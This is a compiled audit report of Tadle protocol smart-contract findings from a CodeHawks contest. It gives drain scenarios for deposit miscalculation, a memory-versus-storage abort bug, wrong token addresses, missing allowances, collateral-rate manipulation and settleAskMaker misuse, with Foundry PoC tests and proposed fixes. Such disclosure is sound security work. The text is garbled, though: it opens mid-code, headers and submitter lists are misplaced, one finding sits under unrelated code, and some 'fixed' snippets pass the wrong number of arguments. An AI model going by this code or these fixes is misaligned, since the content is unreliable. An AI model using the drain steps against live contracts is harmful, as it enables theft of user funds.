# H-01 - Incorrect Calculation of Deposit Amount in abortBidTakerFixed

**Severity:** high
**Auditor:** CodeHawks
**Protocol:** Tadle
**Keywords:** deposit amount, calculation, abortBidTakerFixed, collateral, offer, refund, trade tax, assert, math, floor, error, function, update, stock, offerInfo, makerInfo, transfer, token, manager, balance

---

# \u0060\u0060\u0060solidity
preMarktes.abortBidTakerFixed(_stock, _offer); 
}
function verifyAccountTypeBalance(address _token, address account, TokenBalanceType accountType, uint256 expectedBalance) interna
    balance = getAccountTypeBalance(_token, account, accountType); 
    console2.log("AccountType", uint256(accountType)); 
    assertEq( 
        balance, 
        expectedBalance, 
        "Account should have the correct amount for account type" 
    );
    return balance; 
}
function getAccountTypeBalance(address _token, address account, TokenBalanceType accountType) public returns(uint256 balance) { 
    balance = tokenManager.userTokenBalanceMap( 
        account, 
        _token, 
        accountType 
    );
    return balance; 
}
function calculateExpectedReferralBonuses(address offerAddr, uint256 offerPoints, uint256 offerAmount, uint256 purchasedPoints) i
    OfferInfo memory offerInfo = preMarktes.getOfferInfo(offerAddr); 
    uint256 depositAmount = purchasedPoints * offerAmount / offerPoints; 
    uint256 platformFeeRate = systemConfig.getPlatformFeeRate(taker1); 
    uint256 platformFee = depositAmount * platformFeeRate / Constants.PLATFORM_FEE_DECIMAL_SCALER; 
    
    ReferralInfo memory referralInfo = systemConfig.getReferralInfo(taker1); 
    expectedReferrerBonus = (platformFee * referralInfo.referrerRate) / Constants.REFERRAL_RATE_DECIMAL_SCALER; 
    expectedTakerBonus = (platformFee * referralInfo.authorityRate) / Constants.REFERRAL_RATE_DECIMAL_SCALER; 
    return (expectedReferrerBonus, expectedTakerBonus); 
}
function calculateExpectedSalesRevenue(address offerAddr, uint256 purchasedPoints) internal view returns (uint256 expectedSalesRe
    OfferInfo memory offerInfo = preMarktes.getOfferInfo(offerAddr); 
    
    expectedSalesRevenue = purchasedPoints * offerInfo.amount / offerInfo.points; 
    
    return expectedSalesRevenue; 
}
function calculateExpectedTaxIncome(address offerAddr, bool isMaker, address _maker, uint256 depositAmount) internal view returns
    uint256 tradeTax = isMaker? preMarktes.getMakerInfo(_maker).eachTradeTax : preMarktes.getOfferInfo(offerAddr).tradeTax; 
    assertGt(tradeTax, 0, "Trade tax should be greater than 0"); 
    
    expectedTaxIncome = (depositAmount * tradeTax) / Constants.EACH_TRADE_TAX_DECIMAL_SCALER; 
    return expectedTaxIncome; 
}
\u0060\u0060\u0060

- Likelihood: HIGH 
- Impact: HIGH 
- Severity: HIGH

- Manual Review and Foundry Testing.
Update the \u0060abortBidTaker()\u0060 function to use the correct formula for calculating the deposit amount: 

\u0060\u0060\u0060solidity
uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.amount, preOfferInfo.points, Math.Rounding.Floor);
\u0060\u0060\u0060

An example implementation is shown below;
## Abort Bid Taker Function

\u0060\u0060\u0060solidity
/**
 * @notice abort bid taker 
 * @param _stock stock address 
 * @param _offer offer address 
 * @notice Only offer owner can abort bid taker 
 * @dev Only offer abort status is aborted can be aborted 
 * @dev Update stock authority refund amount 
 */ 
function abortBidTakerFixed(address _stock, address _offer) external { 
    StockInfo storage stockInfo = stockInfoMap[_stock]; 
    OfferInfo storage preOfferInfo = offerInfoMap[_offer]; 
    if (stockInfo.authority != _msgSender()) { 
        revert Errors.Unauthorized(); 
    } 
    if (stockInfo.preOffer != _offer) { 
        revert InvalidOfferAccount(stockInfo.preOffer, _offer); 
    } 
    if (stockInfo.stockStatus != StockStatus.Initialized) { 
        revert InvalidStockStatus( 
            StockStatus.Initialized, 
            stockInfo.stockStatus 
        ); 
    } 
    if (preOfferInfo.abortOfferStatus != AbortOfferStatus.Aborted) { 
        revert InvalidAbortOfferStatus( 
            AbortOfferStatus.Aborted, 
            preOfferInfo.abortOfferStatus 
        ); 
    } 
    uint256 depositAmount = stockInfo.points.mulDiv( 
        preOfferInfo.amount, 
        preOfferInfo.points, // @audit - FIX: pointsPurchased * offerInfo.amount / totalPoints, however this doesn\u0027t account for 
        Math.Rounding.Floor 
    );
    uint256 transferAmount = OfferLibraries.getDepositAmount( 
        preOfferInfo.offerType, 
        preOfferInfo.collateralRate, 
        depositAmount, 
        false, 
        Math.Rounding.Floor 
    );
    MakerInfo storage makerInfo = makerInfoMap[preOfferInfo.maker]; 
    ITokenManager tokenManager = tadleFactory.getTokenManager(); 
    tokenManager.addTokenBalance( 
        TokenBalanceType.MakerRefund, 
        _msgSender(), 
        makerInfo.tokenAddress, 
        transferAmount 
    );
    console.log("transferAmount", transferAmount); 
    console.log("depositAmount", depositAmount); 
    console.log("stockInfo.points", stockInfo.points); 
    console.log("preOfferInfo.points", preOfferInfo.points); 
    console.log("preOfferInfo.amount", preOfferInfo.amount); 
    stockInfo.stockStatus = StockStatus.Finished; 
    emit AbortBidTaker(_offer, _msgSender()); 
}
\u0060\u0060\u0060
Submitted by [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [heaven1024](https://profiles.cyfrin.io/u/heaven1024), [matejdb](https://profiles.cyfrin.io/u/matejdb), [pavankv](https://profiles.cyfrin.io/u/pavankv), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [h2134](https://profiles.cyfrin.io/u/h2134), [eeyore](https://profiles.cyfrin.io/u/eeyore), [tamer](https://profiles.cyfrin.io/u/tamer), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [demorextess](https://profiles.cyfrin.io/u/demorextess), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [marswhitehacker](https://profiles.cyfrin.io/u/marswhitehacker), [0xlookman](https://profiles.cyfrin.io/u/0xlookman), [Chad0](https://profiles.cyfrin.io/u/Chad0), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [recursiveeth](https://profiles.cyfrin.io/u/recursiveeth), [atharv181](https://profiles.cyfrin.io/u/atharv181), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [azanux](https://profiles.cyfrin.io/u/azanux), [456456](https://profiles.cyfrin.io/u/456456), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [bladesec](https://profiles.cyfrin.io/u/bladesec), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [dimah7](https://profiles.cyfrin.io/u/dimah7), [pascal](https://profiles.cyfrin.io/u/pascal), [pandasec](https://profiles.cyfrin.io/u/pandasec), [dinkras](https://profiles.cyfrin.io/u/dinkras). Selected submission by: [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0).

Tadle allows users to seamlessly trade points with collateral tokens. Sellers provide points guarded with deposited collateral, and buyers provide collateral with which they buy the set points. Users can also close or abort their offers if they decide that they no longer want to continue trading. When an offer is closed, it can then be re-listed with the same parameters. When an offer is aborted, it can\u0027t be relisted anymore. In the Protected mode, as there is only a single level of relisting, offers can be aborted at any time, however, in Turbo mode if an offer is re-listed, the initial offer cannot be aborted, as it provides the initial collateral for all subsequent listing. Due to an invalid use of memory instead of storage, this invariant can be broken.

Whenever an ASK offer is re-listed, the initial offer\u0027s abortOfferStatus is set to AbortOfferStatus.SubOfferListed so that it can no longer be aborted, as this offer is the main collateral provider for all subsequent listing. However, the current code logic uses memory instead of storage to apply this state change, meaning that the new state will not be preserved after the function call ends:

\u0060\u0060\u0060solidity
function listOffer( 
    address _stock, 
    uint256 _amount, 
    uint256 _collateralRate 
) external payable { 
    __SNIP__ 
    /// @dev change abort offer status when offer settle type is turbo 
    if (makerInfo.offerSettleType == OfferSettleType.Turbo) { 
        address originOffer = makerInfo.originOffer; 
        OfferInfo memory originOfferInfo = offerInfoMap[originOffer]; // state won\u0027t be preserved 
        if (_collateralRate != originOfferInfo.collateralRate) { 
            revert InvalidCollateralRate(); 
        } 
        originOfferInfo.abortOfferStatus = AbortOfferStatus.SubOfferListed; 
    } 
    __SNIP__ 
}
\u0060\u0060\u0060

Because of this, a malicious user can set up and drain protocol in three steps:
1. One user creates three separate accounts.
2. He/She creates an ASK offer in Turbo mode for 1000 points, at 1e18 amount and 15_000 collateral. There will be an initial collateral deposit of 15e17.
3. He then accepts the ASK offer with his/her second account. He will deposit the required amount to buy the tokens - 1e18 + taxes. The initial account will have a SalesRevenue balance of 1e18 now.
1. The new BID stock is relisted as an ASK offer, but this time the user does not need to provide collateral.
2. He/She then uses his 3rd account to take the ASK offer. He/She deposits 1e18 with taxes. The second account now has SalesRevenue of 1e18.
3. The user now calls \u0060PreMarkets::abortAskOffer(...)\u0060 with his initial offer ID, meaning that the initial offer can no longer be settled. The initial account also receives 5e17 which is the overhead of his initial offer creation.
4. He then settles the second offer with 0 settled points.
5. He finally calls \u0060PreMarkets::closeBidTaker(...)\u0060, which refunds the initial collateral of 15e17.
6. When the user combines his funds he acquired ~0.5 ether - 4.9e17 due to platform tax. What is more, he gets to keep his points as well.

The below PoC shows how the exploit can occur. For the sake of the test, I have fixed the issue with the invalid point token address being passed when assigning PointTokenBalance to users. I have described this issue in my other issue Users can drain the protocol by withdrawing collateral instead of points due to invalid point token address in \u0060DeliveryPlace::closeBidTaker(...)\u0060 and \u0060DeliveryPlace::settleAskTaker(...)\u0060. I have fixed the \u0060PreMarkets.sol\u0060 contract name as it was \u0060PreMarktes\u0060. I also use a helper function added in \u0060TokenManager.sol\u0060:

\u0060\u0060\u0060solidity
function getUserAccountBalance(address _accountAddress, address _tokenAddress, TokenBalanceType _tokenBalanceType) 
    external 
    view 
    returns (uint256) 
{
    return userTokenBalanceMap[_accountAddress][_tokenAddress][_tokenBalanceType]; 
}
\u0060\u0060\u0060

The following test can be run by adding the snippets in \u0060PreMarkets.t.sol\u0060 and running \u0060forge test --mt testImproperStateChange -vv\u0060. I am using the following setup for the tests:
## Set-up
A malicious user can drain the protocol.

Manual review

Use storage over memory when the state needs to be preserved after the function call ends.

H-08. The \u0060DeliveryPlace::settleAskTaker()\u0060 function mistakenly uses \u0060makerInfo.tokenAddress\u0060 to update the TokenBalanceType.PointToken in the userTokenBalanceMap mapping, leading to a critical error.

Submitted by [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [heaven1024](https://profiles.cyfrin.io/u/heaven1024), [eeyore](https://profiles.cyfrin.io/u/eeyore), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [touthang](https://profiles.cyfrin.io/u/touthang), [h2134](https://profiles.cyfrin.io/u/h2134), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [100HP](https://codehawks.cyfrin.io/team/clzlerf3j0009onp0zvsoyzzl), [0xlrivo](https://profiles.cyfrin.io/u/0xlrivo), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), bigsam
The DeliveryPlace::settleAskTaker() function mistakenly uses makerInfo.tokenAddress to update the TokenBalanceType.PointToken in the userTokenBalanceMap mapping, leading to a critical error.

When UserA creates a Bid.offer, the transaction process unfolds as follows:
1. UserA creates a Bid.offer by calling PreMarkets::createOffer().
2. UserB calls PreMarkets::createTaker() using the Bid.offer.offerAddr and a specified amount.
3. The administrator updates the market by calling SystemConfig::updateMarket.
4. UserB then calls DeliveryPlace::settleAskTaker() to settle the transaction. During this step, UserB transfers mockPointToken to the contract, fulfilling the amount promised in step 2, and updates the balance information in userTokenBalanceMap.

Below is the relevant code from DeliveryPlace::settleAskTaker():
\u0060\u0060\u0060solidity
function settleAskTaker(address _stock, uint256 _settledPoints) external { 
    IPerMarkets perMarkets = tadleFactory.getPerMarkets(); 
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock); 
    ( 
        OfferInfo memory offerInfo, 
        MakerInfo memory makerInfo, 
        MarketPlaceInfo memory marketPlaceInfo, 
        MarketPlaceStatus status 
    ) = getOfferInfo(stockInfo.preOffer); 
    // SNIP... 
    uint256 settledPointTokenAmount = marketPlaceInfo.tokenPerPoint * 
        _settledPoints; 
    ITokenManager tokenManager = tadleFactory.getTokenManager(); 
    if (settledPointTokenAmount > 0) { 
        tokenManager.tillIn( 
            _msgSender(), 
            marketPlaceInfo.tokenAddress, 
            settledPointTokenAmount, 
            true 
        ); 
        tokenManager.addTokenBalance( 
            TokenBalanceType.PointToken, 
            offerInfo.authority, 
            makerInfo.tokenAddress, 
            settledPointTokenAmount 
        ); 
    } 
    // SNIP... 
}
\u0060\u0060\u0060
In the above code, \u0060tokenManager.addTokenBalance()\u0060 incorrectly uses \u0060makerInfo.tokenAddress\u0060 when updating the \u0060TokenBalanceType.PointToken\u0060 balance for the user. Instead, the \u0060marketPlaceInfo.tokenAddress\u0060 should be used. This misstep leads to an incorrect balance being recorded in the \u0060userTokenBalanceMap\u0060, which could result in serious errors during settlement.
## PoC
To demonstrate the issue, add the following test code to \u0060test/PreMarkets.t.sol\u0060 and run it:

Note: Before running the PoC, address the issue related to the incorrect permission check in the \u0060DeliveryPlace::settleAskTaker()\u0060 function, where the caller\u0027s address is mistakenly validated against the wrong authority.
\u0060\u0060\u0060solidity
function test_DeliveryPlace_settleAskTaker_addTokenBalance_error() public { 
    /////////////////////////// 
    // user create Bid.Offer // 
    /////////////////////////// 
    vm.prank(user); 
    // transfer mockUSDCToken 1e16 to capitalPool 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            1000,  
            0.01 * 1e18,  
            12000,  
            300,  
            OfferType.Bid, 
            OfferSettleType.Turbo 
        ) 
    );
    // Cache user\u0027s offer address 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    //////////////////////// 
    // user2 create Taker // 
    //////////////////////// 
    vm.prank(user2); 
    // transfer mockUSDCToken 1.235e16 to capitalPool 
    preMarktes.createTaker(offerAddr, 1000); 
    // Cache user2\u0027s stock address 
    address user2StockAddr = GenerateAddress.generateStockAddress(1); 
     
    //////////////////////// 
    // admin updateMarket // 
    //////////////////////// 
    vm.prank(user1); 
    systemConfig.updateMarket( 
        "Backpack", 
        address(mockPointToken), 
        0.01 * 1e18, 
        block.timestamp - 1, 
        3600 
    );
    ////////////////////////// 
    // user2 settleAskTaker // 
    //////////////////////////        
    vm.startPrank(user2); 
    mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18); 
    // transfer mockPointToken 1e19 to capitalPool 
    deliveryPlace.settleAskTaker(user2StockAddr, 1000); 
    vm.stopPrank(); 
    ////////////////////////// 
    //  check user balance  // 
    ////////////////////////// 
    // user 
    uint256 usermockPointTokenAmount_PointToken = tokenManager.userTokenBalanceMap( 
        address(user), 
        address(mockPointToken), 
        TokenBalanceType.PointToken 
    );
    console2.log("usermockPointTokenAmount_PointToken:",usermockPointTokenAmount_PointToken); 
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
uint256 usermockUSDCTokenAmount_PointToken = tokenManager.userTokenBalanceMap( 
    address(user), 
    address(mockUSDCToken), 
    TokenBalanceType.PointToken 
);
console2.log("usermockUSDCTokenAmount_PointToke:", usermockUSDCTokenAmount_PointToken); 
\u0060\u0060\u0060
- [PASS] test_DeliveryPlace_settleAskTaker_addTokenBalance_error() (gas: 1116914) 
  - Logs: 
    - usermockPointTokenAmount_PointToken: 0 
    - usermockUSDCTokenAmount_PointToke: 10000000000000000000 

The test logs will show that the userTokenBalanceMap was updated incorrectly.

The incorrect use of makerInfo.tokenAddress when updating the TokenBalanceType.PointToken balance in userTokenBalanceMap leads to a serious error.

Manual Review

Please use marketPlaceInfo.tokenAddress when updating the balance for TokenBalanceType.PointToken.
Submitted by [justawanderkid](https://profiles.cyfrin.io/u/justawanderkid), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [izcoser](https://profiles.cyfrin.io/u/izcoser), [dustinhuel2](https://profiles.cyfrin.io/u/dustinhuel2), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [vladzaev](https://profiles.cyfrin.io/u/vladzaev), [schereo](https://profiles.cyfrin.io/u/schereo), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [eeyore](https://profiles.cyfrin.io/u/eeyore), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [lazydog](https://profiles.cyfrin.io/u/lazydog), [irondevx](https://profiles.cyfrin.io/u/irondevx), [matejdb](https://profiles.cyfrin.io/u/matejdb), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [0xdarko](https://profiles.cyfrin.io/u/0xdarko), [jovemjeune](https://profiles.cyfrin.io/u/jovemjeune), [aksoy](https://profiles.cyfrin.io/u/aksoy), [wickie](https://profiles.cyfrin.io/u/wickie), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [pina](https://profiles.cyfrin.io/u/pina), [karanel](https://profiles.cyfrin.io/u/karanel), [ro1sharkm](https://profiles.cyfrin.io/u/ro1sharkm), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [x18a6](https://profiles.cyfrin.io/u/x18a6), [dinkras](https://profiles.cyfrin.io/u/dinkras), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri), [amaron](https://profiles.cyfrin.io/u/amaron), [tnevler](https://profiles.cyfrin.io/u/tnevler), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [bladesec](https://profiles.cyfrin.io/u/bladesec), [aresaudits](https://profiles.cyfrin.io/u/aresaudits), [kamensec](https://profiles.cyfrin.io/u/kamensec), [gkrastenov](https://profiles.cyfrin.io/u/gkrastenov), [Audittens](https://profiles.cyfrin.io/u/Audittens). Selected submission by: [izcoser](https://profiles.cyfrin.io/u/izcoser).

The protocol uses a contract called TokenManager to control a capital pool that stores tokens. When a user wants to withdraw, the TokenManager needs spender allowance on the capital pool, but this is not checked for, so the withdrawal fails.

\u0060\u0060\u0060solidity
function settleAskTaker(address _stock, uint256 _settledPoints) external { 
    IPerMarkets perMarkets = tadleFactory.getPerMarkets(); 
    StockInfo memory stockInfo = perMarkets.getStockInfo(_stock); 
    ( 
        OfferInfo memory offerInfo, 
        MakerInfo memory makerInfo, 
        MarketPlaceInfo memory marketPlaceInfo, 
        MarketPlaceStatus status 
    ) = getOfferInfo(stockInfo.preOffer); 
    // SNIP... 
    uint256 settledPointTokenAmount = marketPlaceInfo.tokenPerPoint * 
        _settledPoints; 
    ITokenManager tokenManager = tadleFactory.getTokenManager(); 
    if (settledPointTokenAmount > 0) { 
        tokenManager.tillIn( 
            _msgSender(), 
            marketPlaceInfo.tokenAddress, 
            settledPointTokenAmount, 
            true 
        ); 
        tokenManager.addTokenBalance( 
            TokenBalanceType.PointToken, 
            offerInfo.authority, 
            makerInfo.tokenAddress, 
            marketPlaceInfo.tokenAddress, 
            settledPointTokenAmount 
        ); 
    } 
    // SNIP... 
}
\u0060\u0060\u0060
## Withdrawal Failure Due to Zero Allowance

We simulate a user creating an offer, closing it and then trying to withdraw. The withdrawal fails because of zero allowance for the TokenManager as a spender of the capital pool.

\u0060\u0060\u0060solidity
function test_token_withdrawal_fails() public { 
    // Data for creating an offer, not relevant. 
    uint256 points = 1000; 
    uint256 amountToken = 1000000 * 1e18; 
    uint256 collateralRate = 12000; 
    uint256 eachTradeTax = 300; 
    vm.startPrank(user); 
    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, 
            address(mockUSDCToken), 
            points, 
            amountToken, 
            collateralRate, 
            eachTradeTax, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    ); 
    // Close the offer. 
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    address stockAddr = GenerateAddress.generateStockAddress(0); 
    preMarktes.closeOffer(stockAddr, offerAddr); 
    tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund); 
    vm.stopPrank(); 
} 
\u0060\u0060\u0060

\u0060\u0060\u0060
├─ [8858] UpgradeableProxy::withdraw(MockERC20Token: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 4) 
│   ├─ [8339] TokenManager::withdraw(MockERC20Token: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 4) [delegatecall] 
│   │   ├─ [534] TadleFactory::relatedContracts(4) [staticcall] 
│   │   │   └─ ← [Return] UpgradeableProxy: [0x76006C4471fb6aDd17728e9c9c8B67d5AF06cDA0] 
│   │   ├─ [2959] MockERC20Token::transferFrom(UpgradeableProxy: [0x76006C4471fb6aDd17728e9c9c8B67d5AF06cDA0], 0x7E5F4552091A69125
│   │   │   └─ ← [Revert] ERC20InsufficientAllowance(0x6891e60906DEBeA401F670D74d01D117a3bEAD39, 0, 1200000000000000000000000 [1.2
│   │   └─ ← [Revert] TransferFailed() 
│   └─ ← [Revert] TransferFailed() 
└─ ← [Revert] TransferFailed() 
\u0060\u0060\u0060

For every new token whitelisted into the protocol, users will be unable to withdraw them until somebody calls \u0060capitalPool.approve(address(token))\u0060. Because there\u0027s a disruption of protocol functionality, I am reporting this as MEDIUM.

When someone calls the approve, TokenManager gets an allowance of uint.MAX on one of the capital pool\u0027s tokens, which means withdrawals should work for the foreseeable future.

- Forge.

In TokenManager::withdraw, before the safe transfer from call, check and add allowance if necessary.
## H-10. [H-4] The function PreMarkets::listOffer charges an incorrect collateral amount, allowing users to manipulate collateral rates and drain the protocol\u0027s funds

Submitted by [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [0xlrivo](https://profiles.cyfrin.io/u/0xlrivo), [eeyore](https://profiles.cyfrin.io/u/eeyore), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [meeve](https://profiles.cyfrin.io/u/meeve), [0xgenaudits](https://profiles.cyfrin.io/u/0xgenaudits), [0xaman](https://profiles.cyfrin.io/u/0xaman), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [amaron](https://profiles.cyfrin.io/u/amaron), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [bladesec](https://profiles.cyfrin.io/u/bladesec), [philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [honour](https://profiles.cyfrin.io/u/honour), [warrior](https://profiles.cyfrin.io/u/warrior), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0). Selected submission by: [philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher).

The current collateral management system allows a malicious actor to drain the collateral pool by manipulating collateral rates. The issue arises because the collateral deposit charged at the time of listing a non-original offer corresponds to the previously set collateral rate, while the refund upon closing the offer is calculated based on the collateral rate registered on the offer. This discrepancy allows an attacker to exploit the system by manipulating collateral rates.

When a user lists an offer with PreMarkets::listOffer, they choose a collateral rate, which gets set on their offer. However, in the current implementation, the collateral deposit they are charged is based on the previous collateral rate rather than the rate they selected, according to the code snippets below:

\u0060\u0060\u0060solidity
/// @dev transfer collateral when offer settle type is protected 
if (makerInfo.offerSettleType == OfferSettleType.Protected) { 
    uint256 transferAmount = OfferLibraries.getDepositAmount( 
        offerInfo.offerType, 
        offerInfo.collateralRate, 
        _amount, 
        true, 
        Math.Rounding.Ceil 
    ); 
}
\u0060\u0060\u0060

However, the collateral rate that is set on their offer info is the rate they selected:
## Vulnerability Overview

The following code snippet demonstrates a vulnerability in the offer management system:

\u0060\u0060\u0060solidity
/// @dev update offer info 
offerInfoMap[offerAddr] = OfferInfo({ 
    id: stockInfo.id, 
    authority: _msgSender(), 
    maker: offerInfo.maker, 
    offerStatus: OfferStatus.Virgin, 
    offerType: offerInfo.offerType, 
    abortOfferStatus: AbortOfferStatus.Initialized, 
    points: stockInfo.points, 
    amount: _amount, 
    collateralRate: _collateralRate, 
    usedPoints: 0, 
    tradeTax: 0, 
    settledPoints: 0, 
    settledPointTokenAmount: 0, 
    settledCollateralAmount: 0 
});
\u0060\u0060\u0060

On \u0060PreMarkets::closeOffer\u0060, the collateral is refunded upon the cancellation of an order based on the collateral rate that is set on the offer:

\u0060\u0060\u0060solidity
uint256 refundAmount = OfferLibraries.getRefundAmount( 
    offerInfo.offerType, 
    offerInfo.amount, 
    offerInfo.points, 
    offerInfo.usedPoints, 
    offerInfo.collateralRate 
);
\u0060\u0060\u0060

This creates an opportunity for a malicious actor to exploit the system:
1. The attacker takes an existing offer with a low collateral rate.
2. The attacker then lists the offer with a significantly higher collateral rate.
3. Upon canceling the listing, the attacker receives a refund based on the inflated collateral rate, effectively withdrawing more funds than they deposited.

This exploit can lead to all of the protocol\u0027s funds being drained. The impact - user withdrawing more collateral funds than they deposited - is demonstrated in the test case below, which can be included in the \u0060PreMarkets.t.sol\u0060 file:

### Proof Of Code
- Manual code review.

This vulnerability can be addressed by updating the \u0060PreMarkets::listOffer\u0060 function to charge the user the collateral rate they define instead of the original collateral rate, as shown below:

\u0060\u0060\u0060solidity
if (makerInfo.offerSettleType == OfferSettleType.Protected) { 
    uint256 transferAmount = OfferLibraries.getDepositAmount( 
        offerInfo.offerType, 
        _collateralRate, 
        offerInfo.collateralRate, 
        _amount, 
        true, 
        Math.Rounding.Ceil 
    ); 
}
\u0060\u0060\u0060
## Submitted by
- [eeyore](https://profiles.cyfrin.io/u/eeyore)
- [jennifersun](https://profiles.cyfrin.io/u/jennifersun)
- [touthang](https://profiles.cyfrin.io/u/touthang)
- [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful)
- [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2)
- [radin100](https://profiles.cyfrin.io/u/radin100)
- [meeve](https://profiles.cyfrin.io/u/meeve)
- [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon)
- [0xaraj](https://profiles.cyfrin.io/u/0xaraj)
- [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe)
- [VaRuN](https://profiles.cyfrin.io/u/VaRuN)
- [honour](https://profiles.cyfrin.io/u/honour)
- [pascal](https://profiles.cyfrin.io/u/pascal)
- [kupiasec](https://profiles.cyfrin.io/u/kupiasec)
- [0x1912](https://profiles.cyfrin.io/u/0x1912)

### Selected submission by: 
- [jennifersun](https://profiles.cyfrin.io/u/jennifersun)

In turbo settle type, the maker is the only person who deposits some collaterals. So the maker should be the only person who can settle ask maker and get back the collateral. But now the listOffer\u0027s owner can trigger settleAskMaker() to settle and get back some collateral. This will lead that the maker cannot get back all collaterals.

In Turbo settle type, the maker will add some collateral to create one ask offer. Traders can bid this offer to buy some points. And these takers can resell their points bought from the maker via listOffer() with 0 collateral because of the turbo mode. When the market\u0027s status is changed to asksettle, the maker will settle this to get back the collateral via settleAskMaker(). All takers who still hold some points can get the point token via closeBidTaker(). The problem exists in settleAskMaker(). One resell offer (via listOffer())\u0027s owner can still settle this offer to get some collateral via settleAskMaker() in turbo mode. And these collateral belongs to the maker, the original offer owner. This will lead the maker to lose some collateral.

### One possible attack vector:
1. Alice creates one ask offer as the maker, deposits 10000 collateral token to sell 1000 points.
2. Bob creates one taker to buy 500 points via Alice\u0027s offer.
3. Bob resells his points via listOffer().
4. Cathy creates one taker to match Bob\u0027s offer.
5. MarketPlace\u0027s status changes to asksettle.
6. Bob calls settleAskMaker() to settle his offer to get some collaterals. Bob withdraws the collateral from the TokenManager.
7. Alice calls settleAskMaker() to settle her offer to get back all collaterals. Although the account\u0027s balance is updated in userTokenBalanceMap, there may not be enough collateral token in capitalPool to withdraw.
## Function: settleAskMaker

\u0060\u0060\u0060solidity
function settleAskMaker(address _offer, uint256 _settledPoints) external { 
    ( 
        OfferInfo memory offerInfo, 
        MakerInfo memory makerInfo, 
        MarketPlaceInfo memory marketPlaceInfo, 
        MarketPlaceStatus status 
    ) = getOfferInfo(_offer); 
    // The maker has already selled \u0060usedPoints\u0060. 
    if (_settledPoints > offerInfo.usedPoints) { 
        revert InvalidPoints(); 
    } 
    // fixedratio does not support settle in this contract. 
